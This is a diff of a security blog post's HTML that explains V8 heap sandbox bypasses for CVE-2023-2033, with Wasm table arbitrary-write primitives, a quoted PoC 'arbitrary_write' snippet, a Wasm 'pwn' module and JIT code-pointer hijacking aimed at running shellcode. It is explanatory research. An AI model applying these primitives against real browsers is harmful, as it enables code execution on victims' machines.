-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;pwn&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">16</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">call</span> <span class="hljs-title function_">$jstimes3</span><span class="hljs-punctuation">))</span>
-<span class="hljs-punctuation">)</span></code></pre>
+  (func (export &quot;times2&quot;) (type $int2int) (i32.const 16))
+  (func (export &quot;pwn&quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)</code></pre>
 <p>Looking at points <code>[1]</code> and <code>[2]</code>, you can see the declarations for both functions.</p>
 <blockquote>
 <p>Since a full breakdown of the Wasm code will be covered at the very end of this post, feel free to refer to that section if you&#x2019;d like to dive deeper into it! &#x1F64F;&#x1F3FB;</p>
@@ -1518,12 +1518,12 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
 <pre><code class="hljs cpp"><span class="hljs-comment">/* wasm/wasm-objects-inl.h */</span>
 
 <span class="hljs-comment">// WasmIndirectFunctionTable</span>
-<span class="hljs-built_in">TQ_OBJECT_CONSTRUCTORS_IMPL</span>(WasmIndirectFunctionTable)
-<span class="hljs-built_in">PRIMITIVE_ACCESSORS</span>(WasmIndirectFunctionTable, sig_ids, <span class="hljs-type">uint32_t</span>*,
+TQ_OBJECT_CONSTRUCTORS_IMPL(WasmIndirectFunctionTable)
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, sig_ids, <span class="hljs-keyword">uint32_t</span>*,
                     kSigIdsOffset)
-<span class="hljs-built_in">PRIMITIVE_ACCESSORS</span>(WasmIndirectFunctionTable, targets, Address*,    <span class="hljs-comment">// [1]</span>
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, targets, Address*,    <span class="hljs-comment">// [1]</span>
                     kTargetsOffset)
-<span class="hljs-built_in">OPTIONAL_ACCESSORS</span>(WasmIndirectFunctionTable, managed_native_allocations,
+OPTIONAL_ACCESSORS(WasmIndirectFunctionTable, managed_native_allocations,
                    Foreign, kManagedNativeAllocationsOffset)</code></pre>
 <p>Checking the contents at <code>[1]</code>, we can see that the <code>WasmIndirectFunctionTable</code> object contains a <code>targets</code> field. As illustrated in the previous diagram, this field holds the address information for <code>$f42</code> and <code>$f83</code>. Recall that in the first patch, the allocation method was changed from using <code>PRIMITIVE_ACCESSORS</code> to <code>ACCESSORS</code>.</p>
 <pre><code class="hljs bash">d8&gt; %DebugPrintPtr(0x325b001ccea9);
@@ -1553,33 +1553,33 @@ DebugPrint: 0x325b001ccea9: [WasmIndirectFunctionTable]
 <h4 id="3-1-3-Construct-Primitive"><a href="#3-1-3-Construct-Primitive" class="headerlink" title="3.1.3. Construct Primitive"></a>3.1.3. Construct Primitive</h4><p>Now that we understand what kind of values are stored in the <code>targets</code> field, we need to look into how we can actually leverage them. To set a value in this specific field, the <code>WasmIndirectFunctionTable::Set()</code> function is used, which is implemented as follows:</p>
 <pre><code class="hljs cpp"><span class="hljs-comment">/* wasm/wasm-objects.cc */</span>
 
-<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WasmIndirectFunctionTable::Set</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> index, <span class="hljs-type">int</span> sig_id,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                    Address call_target, Object ref)</span> </span>{
-  <span class="hljs-built_in">sig_ids</span>()[index] = sig_id;
-  <span class="hljs-built_in">targets</span>()[index] = call_target;
-  <span class="hljs-built_in">refs</span>().<span class="hljs-built_in">set</span>(index, ref);
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">WasmIndirectFunctionTable::Set</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> index, <span class="hljs-keyword">int</span> sig_id,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                    Address call_target, Object ref)</span> </span>{
+  sig_ids()[index] = sig_id;
+  targets()[index] = call_target;
+  refs().<span class="hljs-built_in">set</span>(index, ref);
 }</code></pre>
 <p>Looking at the code, we can confirm that the <code>call_target</code> value passed as an argument is written to the memory location pointed to by <code>targets</code>. The core realization here was that if an attacker could manipulate this location, it would enable an arbitrary write primitive.</p>
 <p>The next piece of information needed was to verify whether <code>call_target</code> is a value the attacker can control, and if so, what address it should be directed to point to. First of all, the <code>WasmIndirectFunctionTable::Set()</code> function is called inside <code>WasmTableObject::Set()</code>, which can be triggered via the JavaScript API <code>WebAssembly.Table.prototype.set()</code>.</p>
 <pre><code class="hljs jsx"><span class="hljs-comment">// https://github.com/theori-io/v8-sbx-bypass-wasm</span>
 
-  <span class="hljs-keyword">let</span> <span class="hljs-title function_">arbitrary_write</span> = (<span class="hljs-params">where, what</span>) =&gt; {
-    <span class="hljs-title function_">caged_write64</span>(where_ptr, where - <span class="hljs-number">0x8n</span>);
-    <span class="hljs-title function_">caged_write64</span>(what_ptr, what);
-    tbl.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, times2);
-    <span class="hljs-title function_">caged_write64</span>(what_ptr, rwx);
-    <span class="hljs-title function_">caged_write64</span>(where_ptr, targets);
+  <span class="hljs-keyword">let</span> arbitrary_write = <span class="hljs-function">(<span class="hljs-params">where, what</span>) =&gt;</span> {
+    caged_write64(where_ptr, where - <span class="hljs-number">0x8n</span>);
+    caged_write64(what_ptr, what);
+    tbl.set(<span class="hljs-number">1</span>, times2);
+    caged_write64(what_ptr, rwx);
+    caged_write64(where_ptr, targets);
   };
   
 <span class="hljs-comment">// ...</span></code></pre>
 <p>This corresponds to the <code>tbl.set()</code> call in the publicly available PoC example. The <code>index</code> passed as an argument was not an issue since it directly uses the value provided by the user. However, for <code>call_target</code>, the caller utilizes the return value of <code>WasmInstanceObject::GetCallTarget()</code>.</p>
-<pre><code class="hljs cpp"><span class="hljs-function">Address <span class="hljs-title">WasmInstanceObject::GetCallTarget</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> func_index)</span> </span>{
-  wasm::NativeModule* native_module = <span class="hljs-built_in">module_object</span>().<span class="hljs-built_in">native_module</span>();
-  <span class="hljs-keyword">if</span> (func_index &lt; native_module-&gt;<span class="hljs-built_in">num_imported_functions</span>()) {
-    <span class="hljs-keyword">return</span> <span class="hljs-built_in">imported_function_targets</span>().<span class="hljs-built_in">get</span>(func_index);
+<pre><code class="hljs cpp"><span class="hljs-function">Address <span class="hljs-title">WasmInstanceObject::GetCallTarget</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> func_index)</span> </span>{
+  wasm::NativeModule* native_module = module_object().native_module();
+  <span class="hljs-keyword">if</span> (func_index &lt; native_module-&gt;num_imported_functions()) {
+    <span class="hljs-keyword">return</span> imported_function_targets().get(func_index);
   }
-  <span class="hljs-keyword">return</span> <span class="hljs-built_in">jump_table_start</span>() +
-         <span class="hljs-built_in">JumpTableOffset</span>(native_module-&gt;<span class="hljs-built_in">module</span>(), func_index);
+  <span class="hljs-keyword">return</span> jump_table_start() +
+         JumpTableOffset(native_module-&gt;<span class="hljs-keyword">module</span>(), func_index);
 }</code></pre>
 <p>Since the return value of this function was determined by <code>func_index</code>, it posed a significant constraint on specifying an arbitrary address. If <code>func_index</code> falls within the range of imported functions, the value is returned from <code>imported_function_targets</code>; otherwise, it returns an address calculated by adding an offset to <code>jump_table_start()</code>.</p>
 <p><code>imported_function_targets</code> is a field that holds the locations of functions passed from the outside during instance creation. Debugging the pointers it references internally confirms that they point directly to an RWX memory region.</p>
@@ -1601,23 +1601,23 @@ Modified memory (dirty) page list provided, 0 entries.</code></pre>
 <pre><code class="hljs cpp"><span class="hljs-comment">// wasm/wasm-objects.cc</span>
 
 <span class="hljs-comment">// TODO(manoskouk): Does this need to be handlified?</span>
-<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WasmTableObject::Set</span><span class="hljs-params">(Isolate* isolate, Handle&lt;WasmTableObject&gt; table,</span></span>
-<span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">uint32_t</span> index, Handle&lt;Object&gt; entry)</span> </span>{
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">WasmTableObject::Set</span><span class="hljs-params">(Isolate* isolate, Handle&lt;WasmTableObject&gt; table,</span></span>
+<span class="hljs-function"><span class="hljs-params">                          <span class="hljs-keyword">uint32_t</span> index, Handle&lt;Object&gt; entry)</span> </span>{
   <span class="hljs-comment">// Callers need to perform bounds checks, type check, and error handling.</span>
-  <span class="hljs-built_in">DCHECK</span>(<span class="hljs-built_in">IsInBounds</span>(isolate, table, index));
+  DCHECK(IsInBounds(isolate, table, index));
 
   <span class="hljs-function">Handle&lt;FixedArray&gt; <span class="hljs-title">entries</span><span class="hljs-params">(table-&gt;entries(), isolate)</span></span>;
   <span class="hljs-comment">// The FixedArray is addressed with int&apos;s.</span>
-  <span class="hljs-type">int</span> entry_index = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(index);
+  <span class="hljs-keyword">int</span> entry_index = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">int</span>&gt;(index);
 
-  <span class="hljs-keyword">switch</span> (table-&gt;<span class="hljs-built_in">type</span>().<span class="hljs-built_in">heap_representation</span>()) {
+  <span class="hljs-keyword">switch</span> (table-&gt;type().heap_representation()) {
 <span class="hljs-comment">// ...</span>
     <span class="hljs-keyword">default</span>:
-      <span class="hljs-built_in">DCHECK</span>(!table-&gt;<span class="hljs-built_in">instance</span>().<span class="hljs-built_in">IsUndefined</span>());
-      <span class="hljs-keyword">if</span> (WasmInstanceObject::<span class="hljs-built_in">cast</span>(table-&gt;<span class="hljs-built_in">instance</span>())
-              .<span class="hljs-built_in">module</span>()
-              -&gt;<span class="hljs-built_in">has_signature</span>(table-&gt;<span class="hljs-built_in">type</span>().<span class="hljs-built_in">ref_index</span>())) {
-        <span class="hljs-built_in">SetFunctionTableentry</span>(isolate, table, entries, entry_index, entry); <span class="hljs-comment">// &lt;== here</span>
+      DCHECK(!table-&gt;instance().IsUndefined());
+      <span class="hljs-keyword">if</span> (WasmInstanceObject::cast(table-&gt;instance())
+              .<span class="hljs-keyword">module</span>()
+              -&gt;has_signature(table-&gt;type().ref_index())) {
+        SetFunctionTableentry(isolate, table, entries, entry_index, entry); <span class="hljs-comment">// &lt;== here</span>
         <span class="hljs-keyword">return</span>;
       }
       entries-&gt;<span class="hljs-built_in">set</span>(entry_index, *entry);
@@ -1627,54 +1627,54 @@ Modified memory (dirty) page list provided, 0 entries.</code></pre>
 <p>Inside this function, a <code>switch-case</code> statement is used to route the execution to different processing functions based on the table&#x2019;s type. Since the target function we want to reach requires passing through <code>SetFunctionTableentry()</code>, it is processed under the <code>default</code> case, which does not match any of the predefined conditions.</p>
 <pre><code class="hljs cpp"><span class="hljs-comment">// wasm/wasm-objects.cc</span>
 
-<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WasmTableObject::SetFunctionTableentry</span><span class="hljs-params">(Isolate* isolate,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                            Handle&lt;WasmTableObject&gt; table,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                            Handle&lt;FixedArray&gt; entries,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                            <span class="hljs-type">int</span> entry_index,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                            Handle&lt;Object&gt; entry)</span> </span>{
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">WasmTableObject::SetFunctionTableentry</span><span class="hljs-params">(Isolate* isolate,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                            Handle&lt;WasmTableObject&gt; table,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                            Handle&lt;FixedArray&gt; entries,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                            <span class="hljs-keyword">int</span> entry_index,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                            Handle&lt;Object&gt; entry)</span> </span>{
 <span class="hljs-comment">// ...</span>
-  <span class="hljs-keyword">if</span> (WasmExportedFunction::<span class="hljs-built_in">IsWasmExportedFunction</span>(*external)) {  <span class="hljs-comment">// Check is exported</span>
-    <span class="hljs-keyword">auto</span> exported_function = Handle&lt;WasmExportedFunction&gt;::<span class="hljs-built_in">cast</span>(external);
+  <span class="hljs-keyword">if</span> (WasmExportedFunction::IsWasmExportedFunction(*external)) {  <span class="hljs-comment">// Check is exported</span>
+    <span class="hljs-keyword">auto</span> exported_function = Handle&lt;WasmExportedFunction&gt;::cast(external);
     <span class="hljs-function">Handle&lt;WasmInstanceObject&gt; <span class="hljs-title">target_instance</span><span class="hljs-params">(exported_function-&gt;instance(),</span></span>
-<span class="hljs-params"><span class="hljs-function">                                               isolate)</span></span>;
-    <span class="hljs-type">int</span> func_index = exported_function-&gt;<span class="hljs-built_in">function_index</span>();
-    <span class="hljs-keyword">auto</span>* wasm_function = &amp;target_instance-&gt;<span class="hljs-built_in">module</span>()-&gt;functions[func_index];
-    <span class="hljs-built_in">UpdateDispatchTables</span>(isolate, *table, entry_index, wasm_function,
+<span class="hljs-function"><span class="hljs-params">                                               isolate)</span></span>;
+    <span class="hljs-keyword">int</span> func_index = exported_function-&gt;function_index();
+    <span class="hljs-keyword">auto</span>* wasm_function = &amp;target_instance-&gt;<span class="hljs-keyword">module</span>()-&gt;functions[func_index];
+    UpdateDispatchTables(isolate, *table, entry_index, wasm_function,
                          *target_instance);
-  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WasmJSFunction::<span class="hljs-built_in">IsWasmJSFunction</span>(*external)) {
-    <span class="hljs-built_in">UpdateDispatchTables</span>(isolate, table, entry_index,
-                         Handle&lt;WasmJSFunction&gt;::<span class="hljs-built_in">cast</span>(external));
+  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WasmJSFunction::IsWasmJSFunction(*external)) {
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&lt;WasmJSFunction&gt;::cast(external));
   } <span class="hljs-keyword">else</span> {
-    <span class="hljs-built_in">DCHECK</span>(WasmCapiFunction::<span class="hljs-built_in">IsWasmCapiFunction</span>(*external));
-    <span class="hljs-built_in">UpdateDispatchTables</span>(isolate, table, entry_index,
-                         Handle&lt;WasmCapiFunction&gt;::<span class="hljs-built_in">cast</span>(external));
+    DCHECK(WasmCapiFunction::IsWasmCapiFunction(*external));
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&lt;WasmCapiFunction&gt;::cast(external));
   }
   entries-&gt;<span class="hljs-built_in">set</span>(entry_index, *entry);
 }</code></pre>
 <p>Inside the <code>WasmTableObject::SetFunctionTableentry()</code> function, the behavior varies depending on the location of the target function. The vulnerable logic can be reached specifically when the function is &#x2018;exported&#x2019;. The other two cases, despite sharing the same function name, are handled by overloaded functions with different parameters, so careful attention is required.</p>
 <pre><code class="hljs cpp"><span class="hljs-comment">// static</span>
-<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WasmTableObject::UpdateDispatchTables</span><span class="hljs-params">(Isolate* isolate,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                           WasmTableObject table,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                           <span class="hljs-type">int</span> entry_index,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                           <span class="hljs-type">const</span> wasm::WasmFunction* func,</span></span>
-<span class="hljs-params"><span class="hljs-function">                                           WasmInstanceObject target_instance)</span> </span>{
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">WasmTableObject::UpdateDispatchTables</span><span class="hljs-params">(Isolate* isolate,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                           WasmTableObject table,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                           <span class="hljs-keyword">int</span> entry_index,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                           <span class="hljs-keyword">const</span> wasm::WasmFunction* func,</span></span>
+<span class="hljs-function"><span class="hljs-params">                                           WasmInstanceObject target_instance)</span> </span>{
 <span class="hljs-comment">// ...</span>
 
-  Address call_target = target_instance.<span class="hljs-built_in">GetCallTarget</span>(func-&gt;func_index);
+  Address call_target = target_instance.GetCallTarget(func-&gt;func_index);
 
-  <span class="hljs-type">int</span> original_sig_id = func-&gt;sig_index;
+  <span class="hljs-keyword">int</span> original_sig_id = func-&gt;sig_index;
 
-  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, len = dispatch_tables.<span class="hljs-built_in">length</span>(); i &lt; len;
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, len = dispatch_tables.length(); i &lt; len;
        i += kDispatchTablenumElements) {
-    <span class="hljs-type">int</span> table_index =
-        Smi::<span class="hljs-built_in">cast</span>(dispatch_tables.<span class="hljs-built_in">get</span>(i + kDispatchTableIndexOffset)).<span class="hljs-built_in">value</span>();
-    WasmInstanceObject instance = WasmInstanceObject::<span class="hljs-built_in">cast</span>(
-        dispatch_tables.<span class="hljs-built_in">get</span>(i + kDispatchTableInstanceOffset));
-    <span class="hljs-type">int</span> sig_id = target_instance.<span class="hljs-built_in">module</span>()
+    <span class="hljs-keyword">int</span> table_index =
+        Smi::cast(dispatch_tables.get(i + kDispatchTableIndexOffset)).value();
+    WasmInstanceObject instance = WasmInstanceObject::cast(
+        dispatch_tables.get(i + kDispatchTableInstanceOffset));
+    <span class="hljs-keyword">int</span> sig_id = target_instance.<span class="hljs-keyword">module</span>()
                      -&gt;isorecursive_canonical_type_ids[original_sig_id];
-    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::<span class="hljs-built_in">cast</span>(
-        instance.<span class="hljs-built_in">indirect_function_tables</span>().<span class="hljs-built_in">get</span>(table_index));
-    ift.<span class="hljs-built_in">Set</span>(entry_index, sig_id, call_target, call_ref);
+    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::cast(
+        instance.indirect_function_tables().get(table_index));
+    ift.Set(entry_index, sig_id, call_target, call_ref);
   }
 }</code></pre>
 <p>Once we reach the <code>WasmTableObject::UpdateDispatchTables()</code> function, we can finally observe the previously explained <code>GetCallTarget()</code> and <code>WasmIndirectFunctionTable::Set()</code> functions in action.</p>
@@ -1708,28 +1708,28 @@ Modified memory (dirty) page list provided, 0 entries.</code></pre>
 <p>Once arbitrary address write is achieved, executing arbitrary code becomes possible as well.</p>
 <p>Since the process above writes 8 bytes (corresponding to a pointer size) to an arbitrary address, you can write the desired shellcode into the RWX page 8 bytes at a time, and then call it to execute the injected shellcode.</p>
 <h4 id="3-1-4-Wasm-Syntax"><a href="#3-1-4-Wasm-Syntax" class="headerlink" title="3.1.4. Wasm Syntax"></a>3.1.4. Wasm Syntax</h4><p>Before exploring the bypass method using JIT, let&#x2019;s take a quick look at the Wasm syntax used in the exploit!</p>
-<pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">module</span>
-  <span class="hljs-comment">;; The common type we use throughout the sample.</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)))</span>
+<pre><code class="hljs wasm">(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  <span class="hljs-comment">;; Import a function named jstimes3 from the environment and call it</span>
-  <span class="hljs-comment">;; $jstimes3 here.</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;env&quot;</span> <span class="hljs-string">&quot;jstimes3&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$jstimes3</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)))</span>
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &quot;env&quot; &quot;jstimes3&quot; (func $jstimes3 (type $int2int)))
 
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;tbl&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">table</span> <span class="hljs-number">2</span> funcref<span class="hljs-punctuation">))</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$f42</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-keyword">i32.const</span> <span class="hljs-number">42</span><span class="hljs-punctuation">)</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$f83</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-keyword">i32.const</span> <span class="hljs-number">83</span><span class="hljs-punctuation">)</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">elem</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">$f42</span> <span class="hljs-variable">$f83</span><span class="hljs-punctuation">)</span>
+  (import &quot;js&quot; &quot;tbl&quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)
+  (func $f83 (result i32) i32.const 83)
+  (elem (i32.const 0) $f42 $f83)
 
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;times2&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">16</span><span class="hljs-punctuation">))</span>
-  <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;pwn&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">type</span> <span class="hljs-variable">$int2int</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">16</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">call</span> <span class="hljs-title function_">$jstimes3</span><span class="hljs-punctuation">))</span>
-<span class="hljs-punctuation">)</span></code></pre>
+  (func (export &quot;times2&quot;) (type $int2int) (i32.const 16))
+  (func (export &quot;pwn&quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)</code></pre>
 <p>First, looking at the beginning and the end, you can see that everything is enclosed within a single <code>(module ...)</code>structure. This is used for the purpose of declaring a Module.</p>
 <p>Next follows <code>(type $int2int (func (param i32) (result i32)))</code>, which declares a function signature. It creates a signature named <code>$int2int</code> that takes a 32-bit integer as an argument and returns a 32-bit integer. This is also used later as the type for the <code>jstimes3</code> function.</p>
 <p><code>(import &quot;env&quot; &quot;jstimes3&quot; (func $jstimes3 (type $int2int)))</code> is the declaration process that allows a JavaScript function, passed during instance creation, to be used inside the Wasm environment.</p>
 <pre><code class="hljs jsx"><span class="hljs-keyword">const</span> importObject = {
-    <span class="hljs-attr">env</span>: {
-        <span class="hljs-attr">jstimes3</span>: <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> <span class="hljs-number">3</span> * n,
+    env: {
+        jstimes3: <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> <span class="hljs-number">3</span> * n,
     },
 <span class="hljs-comment">// ...</span></code></pre>
 <p>As a result, <code>&quot;env&quot; &quot;jstimes3&quot;</code> refers to the external name specified during the passing process, meaning that it will be invoked as <code>$jstimes3</code> when called inside the Wasm environment.</p>
@@ -1740,13 +1740,13 @@ Modified memory (dirty) page list provided, 0 entries.</code></pre>
 <p>Functions <code>$f42</code> and <code>$f83</code> are declared to return 32-bit integers of 42 and 83 upon invocation, respectively, and are registered to the Table via <code>(elem (i32.const 0) $f42 $f83)</code>. Here, <code>i32.const 0</code> specifies that the starting index begins at 0.</p>
 <p>The final two lines handle declaring the export functions that can be invoked from JavaScript; as you can see, the <code>pwn</code>function calls the internal Wasm function <code>$jstimes3</code>.</p>
 <h3 id="3-2-Using-JIT-to-Bypass-Sandbox"><a href="#3-2-Using-JIT-to-Bypass-Sandbox" class="headerlink" title="3.2. Using JIT to Bypass Sandbox"></a>3.2. Using JIT to Bypass Sandbox</h3><h4 id="3-2-1-JIT-Fundamentals"><a href="#3-2-1-JIT-Fundamentals" class="headerlink" title="3.2.1. JIT Fundamentals"></a>3.2.1. JIT Fundamentals</h4><p>As a second method for bypassing the V8 heap sandbox, there is an approach that leverages JIT. JIT, which stands for Just-In-Time, refers to a compilation technique that translates code into machine language at the exact moment the program executes. Since a method utilizing JIT for the CVE-2023-2033 exploit has also been publicly disclosed, I have briefly summarized it in this post.</p>
-<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">foo</span> = (<span class="hljs-params"></span>) =&gt;
+<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> foo = <span class="hljs-function">() =&gt;</span>
 {
   <span class="hljs-keyword">return</span> [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>];
 }
 
-<span class="hljs-title function_">foo</span>();
-%<span class="hljs-title class_">DebugPrint</span>(foo);</code></pre>
+foo();
+%DebugPrint(foo);</code></pre>
 <p>The code above is a simple example that declares and executes a function named <code>foo()</code>, which returns a double array. Printing out the internal structure of the function object <code>foo</code> yields the following output:</p>
 <pre><code class="hljs bash">DebugPrint: 0x6f1001cc631: [Function]
  - map: 0x06f1001043e5 &lt;Map[28](HOLEY_ELEMenTS)&gt; [FastProperties]
@@ -1790,16 +1790,16 @@ DebugPrint: 0x6f100267cb9: [Code] <span class="hljs-keyword">in</span> ReadOnlyS
 Modified memory (dirty) page list provided, 0 entries.</code></pre>
 <p>If we can manipulate the <code>code</code> field to point to an arbitrary address when invoking a JavaScript function, it consequently means we can hijack the Program Counter (PC).</p>
 <h4 id="3-2-2-Exploit-with-JIT"><a href="#3-2-2-Exploit-with-JIT" class="headerlink" title="3.2.2. Exploit with JIT"></a>3.2.2. Exploit with JIT</h4><p>Unlike Wasm JIT code, which is stored outside the V8 heap region, the JIT code for standard JavaScript functions is located inside the V8 heap. To verify this behavior, I modified the previous example as follows and executed it.</p>
-<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">foo</span> = (<span class="hljs-params"></span>) =&gt;
+<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> foo = <span class="hljs-function">() =&gt;</span>
 {
   <span class="hljs-keyword">return</span> [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>];
 }
 
-%<span class="hljs-title class_">PrepareFunctionForOptimization</span>(foo);
-<span class="hljs-title function_">foo</span>();
-%<span class="hljs-title class_">OptimizeFunctionOnNextCall</span>(foo);
-<span class="hljs-title function_">foo</span>();
-%<span class="hljs-title class_">DebugPrint</span>(foo);</code></pre>
+%PrepareFunctionForOptimization(foo);
+foo();
+%OptimizeFunctionOnNextCall(foo);
+foo();
+%DebugPrint(foo);</code></pre>
 <p>To confirm the changes that occur after optimization, I explicitly triggered it using native syntax.</p>
 <pre><code class="hljs bash">DebugPrint: 0x1d04001cc681: [Function]
  - map: 0x1d04001043e5 &lt;Map[28](HOLEY_ELEMenTS)&gt; [FastProperties]
@@ -1917,9 +1917,9 @@ Instructions (size = 480)
                   
                   <a class="hover-with-bg" href="/tags/V8/">V8</a>
                   
-                  <a class="hover-with-bg" href="/tags/Heap-Sandbox/">Heap Sandbox</a>
-                  
                   <a class="hover-with-bg" href="/tags/Wipeload/">Wipeload</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Heap-Sandbox/">Heap Sandbox</a>
                   
                   <a class="hover-with-bg" href="/tags/Browser/">Browser</a>
                   
@@ -1959,9 +1959,9 @@ Instructions (size = 480)
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2026/06/22/poosic/cve-2026-42945/">
+                  <a href="/2026/06/21/ji9umi/Wipeload_step2/kr/">
                     <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[하루한줄] CVE-2026-42945 : NGINX rewrite module의 is_args 상태 미전파로 발생한 Heap Buffer Overflow RCE 취약점</span>
+                    <span class="hidden-mobile">[도닦기] 2단계: Prison Break (KR)</span>
                     <span class="visible-mobile">Previous</span>
                   </a>
                   
@@ -1969,8 +1969,8 @@ Instructions (size = 480)
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2026/06/21/ji9umi/Wipeload_step2/kr/">
-                    <span class="hidden-mobile">[도닦기] 2단계: Prison Break (KR)</span>
+                  <a href="/2026/06/17/banda/CVE-2026-40369/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2026-40369: Windows Kernel(ntoskrnl.exe)의 Untrusted Pointer Dereference로 인한 Arbitrary Kernel Address Increment LPE/Sandbox Escape 취약점</span>
                     <span class="visible-mobile">Next</span>
